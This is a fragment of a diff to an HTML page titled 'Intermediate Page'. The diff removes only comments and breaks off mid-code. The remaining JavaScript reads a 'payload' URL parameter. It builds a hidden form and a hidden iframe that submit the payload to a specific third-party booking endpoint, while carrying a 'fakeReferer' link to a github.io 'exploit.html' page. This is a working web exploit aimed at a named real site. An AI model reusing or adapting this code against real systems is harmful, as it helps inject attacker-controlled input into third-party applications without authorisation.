@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Intermediate Page</title>
     <script>
-        // Function to get URL parameters
         function getUrlParameter(name) {
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
             var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -13,19 +12,16 @@
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
 
-        // Redirect with Referer
         window.onload = function() {
             var payload = getUrlParameter('payload');
             if (payload) {
                 var targetUrl = 'https://tsportalofpurpose.in/oldfiles/booking/create';
                 var fakeReferer = 'https://fcgituser.github.io/fc.github.io/exploit.html?payload=' + encodeURIComponent(payload);
 
-                // Create a form to submit the payload in the Referer header
                 var form = document.createElement('form');
                 form.method = 'get';
                 form.action = targetUrl;
 
-                // Add a hidden input field to the form (to force the referer)
                 var hiddenInput = document.createElement('input');
                 hiddenInput.type = 'hidden';
                 hiddenInput.name = 'fakeReferer';
@@ -34,7 +30,6 @@
 
                 document.body.appendChild(form);
 
-                // Change the referer and submit the form
                 var iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.onload = function() {
